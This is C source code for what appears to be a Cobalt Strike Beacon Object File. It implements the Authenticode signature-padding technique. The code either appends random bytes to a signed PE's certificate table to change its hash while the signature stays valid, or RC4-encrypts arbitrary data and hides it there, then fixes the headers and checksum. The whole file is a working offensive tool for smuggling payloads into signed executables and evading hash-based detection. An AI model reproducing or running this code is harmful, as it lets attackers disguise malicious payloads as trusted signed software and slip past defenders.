#include "common.h"
#include "beacon.h"
#include "helpers.c"


#define KEY_LEN 8

void go(char* args, int length) {

	datap parser;
	char* _fPath = NULL;
	char* _oPath = NULL;
	char* _data;
	DWORD opt;
	SIZE_T _dataSize;
	DWORD _keySize = 0;
	CHAR* _key = NULL;

	BeaconDataParse(&parser, args, length);

	opt = BeaconDataInt(&parser);
	BOOL BIT_FLIP = opt == 0 ? FALSE : TRUE;

	_fPath = BeaconDataExtract(&parser, NULL);
    	_oPath = BeaconDataExtract(&parser, NULL);


	if(!BIT_FLIP){
		_key = BeaconDataExtract(&parser, NULL);
		_keySize = MSVCRT$strlen(_key);
		_dataSize = BeaconDataLength(&parser);
		_data = BeaconDataExtract(&parser, NULL);
	}

	if (checkConfig()) {
		print("[!]: Endpoint hardened against authenticode signature padding, i.e this won't work %s");
		goto _Exit;
	}
	


	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert ;
	unsigned checksum = 0;
	FILE* _outFile = NULL;
	SIZE_T _writtenBytes = 0;
	CHAR* _encryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD  _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	HANDLE _oHandle = INVALID_HANDLE_VALUE;
	DWORD _extraPaddingCount = 0;
	CHAR* _extraPadding = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	CHAR* _sha1Hash = NULL;
	LPWSTR _fwPath = NULL;
	LPWSTR _owPath = NULL;

	//Fix - Write Permission issue leads to beacon crash
	_oHandle = KERNEL32$CreateFileA(_oPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_oHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Cannot Write to specific path - Write Permissions ? Change output path");
		goto _Exit;
	}

	KERNEL32$CloseHandle(_oHandle);
		
	char* _fName = (char*)MSVCRT$malloc(MSVCRT$strlen(_fPath) + 1);
	_fName = getFName(_fPath, _fName);

	char* _oName = (char*)MSVCRT$malloc(MSVCRT$strlen(_oPath) + 1);
	_oName = getFName(_oPath, _oName);


	print("[*]:Loading/Parsing PE File '%s'", _fName);
	_fHandle = KERNEL32$CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}

	//Verifying PE file signature
	toMultiByte(MSVCRT$strlen(_fPath), _fPath, _fwPath);
	if (VerifyPESignature(_fwPath, _fHandle) == 0) {
		print("[*]:PE File '%s' is SIGNED", _fName);
	}
	else {
		print("[*]:PE File '%s' is NOT SIGNED", _fName);
	}
	
	_fSize = KERNEL32$GetFileSize(_fHandle, NULL);
	_rpadding = (char*) MSVCRT$malloc(sizeof(char) * (KEY_LEN + 1));
	genRandomBytes(KEY_LEN , _rpadding);
	if(BIT_FLIP) _fSize += MSVCRT$strlen(_rpadding);
	_peBlob = MSVCRT$malloc(_fSize);

	KERNEL32$ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);

	if (_bytesRead == 0) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}

	PIMAGE_DOS_HEADER _dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		print("'%s' is not a valid PE file", _fName);
		goto _Exit;
	}
	
	//Compute Sha1 hash
	_sha1Hash = (char*) MSVCRT$malloc(((SHA1LEN * 2) + 1) * sizeof(char));
	if (Sha1((BYTE*)_peBlob, _sha1Hash, KERNEL32$GetFileSize(_fHandle, NULL))) {
		print("[+]:PE '%s' SHA1 Hash: %s", _fName, _sha1Hash);
	}
	else {
		print("[!]:Could not compute PE '%s' SHA1 Hash\n", _fName);
		MSVCRT$free(_sha1Hash);
	}

	
	PIMAGE_NT_HEADERS _ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER _optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
	
	//Security entry seems to be located at the 7th offset (Data_Dir) for For x64 PE files, and the 5th offset for x86 PE files. just a quick workaround to make the script work for different PE archs.
	if (IsWow64(KERNEL32$GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}else{
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

	//Bit Flip and Save file to disk
	if (BIT_FLIP) {

		print("[+]:Bit Flipping PE File %s and saving it to %s", _fName, _oName);

		//Add a random set of bytes as padding.
		print("[+]:Padding '%s' with %s ", _fName, _rpadding);
		MSVCRT$memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _rpadding, MSVCRT$strlen(_rpadding));

		//update dwLength and Cert Table Entry Size.
		print("[+]:Updating OPT Header Fields/Entries ");
		_wCert->dwLength += MSVCRT$strlen(_rpadding);
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += MSVCRT$strlen(_rpadding);;

		//update checksum
		print("[+]:Calculating/Updating the new OPTHeader checksum");
		checksum = PEChecksum(_peBlob, _fSize);
		_ntHeader->OptionalHeader.CheckSum = checksum;

		//re-computing the new sha1 hash
		_sha1Hash = (char*)MSVCRT$malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, _fSize)) {
			print("[+]: New PE '%s' SHA1 Hash: %s", _oName, _sha1Hash);
		}
		else {
			print("[!]:Could not compute PE '%s' SHA1 Hash\n", _oName);
			MSVCRT$free(_sha1Hash);
		}

		//save patched PE to disk
		print("[+]:Saving Bit-flipped PE to '%s'", _oName);
		_outFile = MSVCRT$fopen(_oPath, "wb");
		_writtenBytes = MSVCRT$fwrite(_peBlob, _fSize, 1, _outFile);
		MSVCRT$fclose(_outFile);

	}

	//Inject Data and Save file to disk
	else if (!BIT_FLIP) {

		print("[+]:Injecting Data of size %d to PE File '%s'", _dataSize, _fName);

		//RC4 encrypt and Tag
		print("[+]:Encrypting Data of size %d", _dataSize);
		_encryptedData = (CHAR*)MSVCRT$malloc(_dataSize + 8);
		if (_keySize == 0) {
			_key = (CHAR*)MSVCRT$malloc(sizeof(char) * 16);
			genKey(_key);
			_keySize = 15;
		}	
		MSVCRT$memcpy(_encryptedData, "\xFE\xED\xFA\xCE\xFE\xED\xFA\xCE", 8);
		crypt((unsigned char*)_data, _dataSize, _key, _keySize, (unsigned char*)_encryptedData + 8);
		_dataSize += 8;


		//Adjust extra padding
		if ((_fSize + _dataSize) % 8 != 0) {
			while ((_fSize + _dataSize + _extraPaddingCount) % 8 != 0) {
				_extraPaddingCount++;
			}
			_extraPadding = (char*)MSVCRT$malloc(_extraPaddingCount);
			MSVCRT$sprintf(_extraPadding, "%0*d", _extraPaddingCount, 0);
			_encryptedData = (CHAR*) MSVCRT$realloc(_encryptedData, (_dataSize + _extraPaddingCount));
			MSVCRT$memcpy(_encryptedData + _dataSize, _extraPadding, _extraPaddingCount);
			_dataSize += _extraPaddingCount;
		}

		//Increasing buffer size
		_peBlob = MSVCRT$realloc(_peBlob, (_fSize + _dataSize));

		//Re-initialize structures (_peBlob was reallocated)
		_dosHeader = NULL ;
		_ntHeader = NULL ;
		_wCert =  NULL ;
		_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;
		_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
		_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
		_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
		_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
		_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

		//Add padding based on data read from _sPath
		MSVCRT$memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _encryptedData, _dataSize);

		//update dwLength and Cert Table Entry Size.
		print("[+]:Updating OPT Header Fields/Entries ");
		_wCert->dwLength += _dataSize;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += _dataSize;

		//update checksum
		print("[+]:Calculating/Updating the new OPTHeader checksum");
		checksum = PEChecksum(_peBlob, _fSize + _dataSize);
		
		_ntHeader->OptionalHeader.CheckSum = PEChecksum(_peBlob, _fSize + _dataSize);

		print("[+]:Encrypted Data Size: %d", _dataSize);
		print("[+]:Encryption Key: %s", _key);
		print("[+]:Extra Padding: %d", _extraPaddingCount);


		//re-computing the new sha1 hash
		_sha1Hash = (char*)MSVCRT$malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, (_fSize + _dataSize))) {
			print("[+]:New PE '%s' SHA1 Hash: %s", _oName, _sha1Hash);
		}
		else {
			print("[!]:Could not compute PE '%s' SHA1 Hash\n", _oName);
			MSVCRT$free(_sha1Hash);
		}

		//save patched PE to disk
		print("[+]:Saving Modified PE file '%s' to '%s'", _fName, _oName);	
		_outFile = MSVCRT$fopen(_oPath, "wb");
		_writtenBytes = MSVCRT$fwrite(_peBlob, (_fSize + _dataSize), 1, _outFile);
		MSVCRT$fclose(_outFile);
	}
	
	//verify modified PE file signature
	_oHandle = KERNEL32$CreateFileA(_oPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_oHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Could not read file %s\n", _oName);
		goto _Exit;
	}
	toMultiByte(MSVCRT$strlen(_oPath), _oPath, _owPath);
	if (VerifyPESignature(_owPath, _oHandle) == 0) {
		print("[*]:Modified PE '%s' is SIGNED\n", _oName);
	}
	else {
		print("[!]:Modified PE '%s' is NOT SIGNED\n", _oName);
	}
	
	print("Done.");
	
	goto _Exit;

	_Exit:
		if (_fName) MSVCRT$free(_fName);
		if (_oName) MSVCRT$free(_oName);
		if (_rpadding) MSVCRT$free(_rpadding);
		if (_encryptedData) MSVCRT$free(_encryptedData);
		if (_key) MSVCRT$free(_key);
		if (_peBlob) MSVCRT$free(_peBlob);
		if (_fwPath) MSVCRT$free(_fwPath);
		if (_owPath) MSVCRT$free(_owPath);
		if (_sha1Hash) MSVCRT$free(_sha1Hash);
		if (_extraPadding) MSVCRT$free(_extraPadding);
		if (_fHandle) KERNEL32$CloseHandle(_fHandle);
		if (_oHandle) KERNEL32$CloseHandle(_oHandle);

}
